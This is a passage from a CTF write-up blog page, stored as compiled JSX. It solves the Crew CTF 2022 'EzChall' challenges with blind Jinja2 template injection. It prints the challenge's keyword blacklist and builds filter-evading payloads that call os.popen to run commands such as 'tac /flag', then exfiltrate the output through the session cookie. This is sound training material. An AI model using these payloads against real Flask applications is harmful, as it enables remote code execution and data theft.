punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'os'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'popen'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'tail /flag'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'re'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'ad'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"%\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),\"%endif%\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`True\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Finally, we submit it and get the cookie and decode it and get the flag \\\\o/\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-shell\",children:(0,n.jsxs)(e.code,{className:\"language-shell code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"$ flask-unsign -d -c \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"eyJmIjoiY3Jld3s2ZjAyMWQwNWRiNTE1YTEyNGM5OTg1zmN1NTVlMGI2Yn0iLCJ1c2VyIjoiYWRtaW4ifQ.YlveoA.-EYuiEy5AxCtCGn68xioShVhVsg\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'f'\"}),(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'crew{6f021d05db515a124c9985fce55c0b6b}'\"}),\", \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'user'\"}),(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'admin'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.h1,{id:\"ezchall-again-web\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#ezchall-again-web\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"EzChall Again (Web)\"]}),`\n`,(0,n.jsx)(e.p,{children:\"So this is pretty much the same challenge but with more filters, we\\u2019ll use almost the same techniques before just changing some stuff\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` string\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"UNALLOWED \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'class'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'mro'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'init'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'builtins'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'request'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'app'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'sleep'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'add'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'+'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'config'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'subclasses'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'format'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'dict'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'get'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'attr'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'globals'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'time'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'read'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'import'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'sys'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'cookies'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'headers'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'doc'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'url'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'encode'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'decode'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'chr'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'ord'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'replace'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'echo'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'base'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'self'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'template'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'print'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'exec'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'response'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'join'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'cat'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'if'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'end'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'for'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'sum'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'%s'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'\\\\\\\\'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'*'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'\u0026'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"{{\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"}}\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'[]'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:`\"''\"`}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:`'\"\"'`}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'|'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'=='\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'~'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"check_filter\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"lower\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'.'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"':'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'/'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'%'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"len\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"115\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" char \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" char \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" string\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"digits\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" UNALLOWED\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So basically, we can\\u2019t use \",(0,n.jsx)(e.code,{children:\"if\"}),\" / \",(0,n.jsx)(e.code,{children:\"for\"}),\" / \",(0,n.jsx)(e.code,{children:\"lipsum\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Upon reading Jinja2 docs, I\\u2019ve found that we can use \",(0,n.jsx)(e.code,{children:\"Assignments\"}),\" using the function \",(0,n.jsx)(e.code,{children:\"set\"}),\".\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"set\"}),\" a\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})})}),`\n`,(0,n.jsxs)(e.p,{children:[\"As \",(0,n.jsx)(e.code,{children:\"lipsum\"}),\" is filtered because of \",(0,n.jsx)(e.code,{children:\"sum\"}),\", we\\u2019ll use the payload that we created in the first challenge with \",(0,n.jsx)(e.code,{children:\"cycler\"}),\".\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"cycler\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__in'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'it__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__glo'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'bals__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'os'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'popen'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'id'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'rea'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'d'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"Our payload to exfiltrate the flag will be:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"session\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"update\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'f'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\"cycler\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__ini'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'t__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__glo'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'bals__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'os'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'popen'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'tac /flag'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'re'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'ad'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"Our final payload is:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"set\"}),\" a\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"session\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"update\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'f'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\"cycler\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__ini'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'t__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__glo'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'bals__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'os'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'popen'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'tac /flag'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'re'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'ad'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`[len] 114\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`True\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Now, we can use it and get the cookie containing the flag.\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-shell\",children:(0,n.jsxs)(e.code,{className:\"language-shell code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"$ flask-unsign -d -c \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"eyJmIjoiY3Jld3s2NmM5MGMwNzkzYzQ1MmY2YjY4MA5ZWYxYzI4YM3OX0iLCJ1c2VyIjoiYWRtaW4ifQ.Y1v7AQ.5NZKstHzeVcckdiYqsLuOWfvLfw\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'f'\"}),(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'crew{66c90c0793c452f6b68209ef1c28ac79}'\"}),\", \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'user'\"}),(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'admin'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"This is all for this post, I hope you liked these two writeups!\"})]})}}var f=b;return w;})();\n;return Component;","toc":[{"value":"EzChall (Web, 906)","url":"#ezchall-web-906","depth":1},{"value":"EzChall Again (Web)","url":"#ezchall-again-web","depth":1}],"frontMatter":{"readingTime":{"text":"13 min read","minutes":12.215,"time":732900,"words":2443},"slug":"crew-ctf-2022/EzChall","fileName":"crew-ctf-2022/EzChall.md","title":"Crew CTF 2022 – EzChall \u0026 EzChall Again","date":"2022-04-17T00:00:00.000Z","draft":false,"authors":["elleuch"],"tags":["CREW CTF 2022","Web","SSTI","Filter","WAF","Blacklist"],"summary":"Blind SSTI with filters"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.19,"time":11400,"words":38},"slug":["elleuch"],"fileName":"elleuch.md","name":"ElleuchX1","avatar":"https://www.gravatar.com/avatar/7713c4f4229ca2e9b9291755957a2e42?d=identicon\u0026s=256","specialties":["Web","boot2root"],"member":true,"description":"Yeah exactly, the HTB guy","order":7,"date":null}],"prev":{"title":"RITSEC CTF 2022 – 